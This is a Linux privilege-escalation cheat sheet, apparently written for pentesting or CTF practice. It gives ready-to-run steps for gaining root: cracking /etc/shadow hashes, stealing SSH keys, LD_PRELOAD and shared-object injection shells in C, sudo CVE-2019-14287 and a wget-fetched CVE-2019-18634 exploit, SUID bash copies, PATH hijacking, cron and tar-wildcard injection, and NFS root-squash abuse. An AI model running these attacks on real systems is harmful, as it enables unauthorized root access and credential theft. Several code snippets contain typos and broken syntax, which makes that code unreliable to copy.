# Linux Privilege Escalation Cheat Sheet
## Initial Enumeration
### System Enumeration
  ```bash
  hostname
  uname -a
  cat /proc/version
  cat /etc/issue
  lscpu
  ```

### Process Enumeration
  ```bash
  ps aux
  ps aux | grep root
```

### User Enumeration
  ```bash
  whoami
  id
  sudo -l
  cat /etc/passwd
  cat /etc/passwd | cut -d : -f 1
  cat /etc/shadow
  cat /etc/group
  ```
  ```bash
  history
  ```

### Network Enumeration
  ```bash
  ifconfig
  ip a
  ip route
  arp -a
  ip neigh
  ```
  ```bash
  netstat -ano
  ```

## Kernel Exploit
### Kernel Exploit Enumeration
#### Check System Information
  ```bash
  hostname
  uname -a
  cat /etc/lsb-release
  cat /proc/version
  cat /etc/os-release
  cat /etc/issue
  lscpu
  ```

#### Check Running Process Information
  ```bash
  ps aux
  ps aux | grep root
  ```

### Kernel Exploitation Process
  1. Google for Exploits against the OS and Kernel Version 
  2. Download, compile, and run it against the target if it exists
  3. Try something else if it does not exist.

## Escalation via Password & File Permissions
### Stored Password
  A password may be stored in the bash history
  ```bash
  history
  ```
  Or in the files 
  ```bash
  grep --color=auto -rnw '/' -ie "PASSW" --color=always 2> /dev/null
  find . -type f -exec grep -i -I "PASSW" {} /dev/null \;
  ```

### Weak File Permissions
  1. Verify File Permissions
  ```bash
  ls -la /etc/passwd
  ls -la /etc/shadow
  ```
  2. Copy the content of these files
  ```bash
  cat -la /etc/passwd
  cat -la /etc/shadow
  ```
  ```bash
  unshadow <passwd_File> <shadow_file>
  ```
  3. Identify the hash
  ```web
  https://hashcat.net/wiki/doku.php?id=example_hashes
  ```
  4. Crack the Hash with hashcat
  ```powershell
  .\hashcat64.exe -m <hash_typw> <unshadowed_file> .\rockyou.txt -O
  ```
  5. PROFIT!

### SSH Keys
  1.FInd SSH Keys
  ```bash
  find / -name authorized_keys 2> /dev/null
  find / -name id_rsa 2> /dev/null
  ```
  2. Download the SSH key
  3. Change the permissions on the key 
  ```bash
  chmod 600 id_rsa
  ```
  4. Attempt the key
  ```bash
  ssh -i id_rsa <user>@<ip>
  ```
  5. PROFIT!

## Escalation via Sudo
### Sudo Shell Escaping
  1. Look for root NOPASSWORD
  ```bash
  sudo -l
  ```
  2. Check GTFOBins for the binary with sudo
  ```url
  https://gtfobins.github.io/
  ```
  3. Run the command found.
  4. PROFIT!

### Intended Functionality
  1. check what you can run as root
  ```bash
  sudo -l
  ```
  3. Research GTFOBins for the binary
  4. If nothing is found search for <binary> root privilege escalation
  
### LD_PRELOAD
  1. Identify LD_Preload with
  ```bash
  sudo -l
  ```
  2. Generate the following file: Shell.c
  ```C
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  
  void_init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
  }  
  ```
  3. Compile the file:
  ```bash
  gcc -fPIC -shared -o shall.so shell.c -nostartfiles
  ```
  4. Execute the attack
  ```bash
  sudo LD_PRELOAD=<Path/to/>shell.so <binary we can run as sudo>
  ```
  5. ROOT!

### CVE-2019-14287
  1. Run sudo -l
  ```bash
  sudo -l
  ```
  2. Check that you see: (ALL, !root) NOPASSWD: /bin/bash
  3. Attempt the attack
  ```bash
  sudo -u#-1 /bin/bash
  ```
  4. ROOT!
  
### CVE-2019-18634
  1. Check version of sudo for version before 1.8.26
  2. Get the POC into the machine
  ```bash
  wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c -O exploit.c
  ```
  3. Compile exploit.c
  ```bash
  gcc -o exploit exploit.c
  ```
  4. Run the exploit
  ```bash
  ./exploit
  ```
  5. ROOT!
  
## Escalation via SUID
### SUID
  1. Find files with the SUID set
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
  2. Check GTFOBins for SUID and find a suitable binary
  3. Run the code associated with the binary and SUID

### Shared Object Injection
  1. Identify files with shared objects bit set
  ```bash
  find / -type f -perm -04000 -ls 2>/dev/null
  ```
  2. Enumerate information related to the binary.
  ```bash
  la -lah <path/to/binary>
  ```
  3. Run the Binary with strace
  ```bash
  strace <path/to/binary> 2>&1
  ```
  ```bash
  strace <path/to/binary> 2>&1 | grep -i -E "open|access|no such file"
  ```
  4. Identify what files are opened that are writeable
  5. Write a malicious C file exploit.c
  ```C
  #include <stdio.h>
  #include <stdlib.h>

  static void inject() __atribute__((constructor)) {
    system(" cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
  } 
  ```
  6. compile the malicious exploit.
  ```bash
  gcc -shared -fPIC -o <path/to/opened/file_found_with_strace> <path/to/exploit.c>
  ```
  7. Run the orignal binary that makes the call
  8. ROOT!
  
### Binary Symlinks in nginx with CVE-2016-1247
  1. Check the version of nginx of 1.6.2 or earlier
  ```bash
  dpkg -l | grep nginx
  ```
  2. verify that the SUID bit is set on sudo
  ```bash
  find / -type f -perm -04000 -ls 2>/dev/null
  ```
  3. Run the Linux Exploit Suggester
  4. Find CVE-2016-1247
  5. Check the nginx log files for rwx in the folder
  ```bash
  ls -la /var/log/nginx
  ```
  6. Run the PoC
  ```bash
  ./nginxed-root.sh /var/log/nginx/error.log
  ```
  7. Generate a log event
  8. ROOT!
 
 ### Environmental Variables
  1. Check the SUIDs
  ```bash
  find / -type f -perm -04000 -ls 2>/dev/null
  ```
  2. run the binary and check the strings, if it only calls the service continue, if it calls the full path skip to 6
  ```bash
  strings <path/to/binary>
  ```
  3. Check the path variable
  ```bash
  print $PATH
  ```
  4. create a malicious C file and compile it
  ```c
  echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
  gcc /tmp/service.c -o /tmp/service
  ```
  5. Change the PATH variable
  ```bash
  export PATH=/tmp:$PATH
  ```
  6. create a malicious function
  ```bash
  function <path to binary>() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
  export -f <path to binary>
  ```
  
## Escalation via Capabilities
### Capabilities
  1. Check the capabilities
  ```bash
  getcap -r / 2>/dev/null
  ```
  2. Find binaries with cap_setuid+ep
  3. Check GTFObins for Capabilities
  4. Run the command found in GTFObins
  ```bash
  <path of binary> <command to root>
  ```
  5. ROOT!

## Escalation via Scheduled Tasks
### Check Schedule tasks
  ```bash
  cat /etc/crontab
  crontab -l
  ls -lah /var/spool/cron
  ls -lah /etc/cron*
  cat /etc/at.allow
  cat /etc/at.deny
  systemctl list-timers --all
  ```
    
### Escalation via Cron Paths
  1. Check the PATH= Variable.
  2. Check what files are being run.
  3. Check if the file exists in the file path from left to right.
      * If it does not exist, check if you can write the file
    
    
           i. Create The File With:
           
            echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <path>/<file>
            chmod +x <path><file>
        
           ii. Escalate Privilege
         
            /tmp/bash

      * If the file exists before you find a writeable location, try something else.

### Escalation via Wildcards
  If a command accepts wildcards as an argument and it is present in the crontab or cronjob do the following:
  1. Research the executable
  2. Create files where the name of the file if fed as part of the argument
  3. The executable will interpret the name of the file as part of the command
  4. Profit

  Tar is a good example of this with the payloads
  ```bash
  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > root.sh
  chmod +x root.sh
  ```
  ```bash
  touch --checkpoint=1
  touch --checkpoint-action=exec=sh\root.sh
  ```
  When a backup is done, the files are interpreted as tar arguments.
    
## NFS Root Squashing
  1. Identify files systems and identify no_root_squash
  ```bash
  cat /etc/exports
  ````
  2. Identify the mountable file shares from the local machine
  ```bash
  showmount -e <ip>
  ````
  3. Create a folder for the file syste, and mountit
  ```bash
  mkdir /tmp/mount
  mount -o rw,vers=2 <IP>:<mount> /tmp/mount
  ```
  4. Create a malicious exploit.c file and build it
  ```bach
  echo 'int main() { setgid(0); setuid(0); syste,("/bin/bash"); return 0; }' > /tmp/mount/exploit.c
  gcc /tmp/mount/exploit.x -o /tmp/mount/exploit
  chmod +s /tmp/mount/exploit
  ```
  5. Execute from the target machine
  ```bash
  ./exploit
  ```
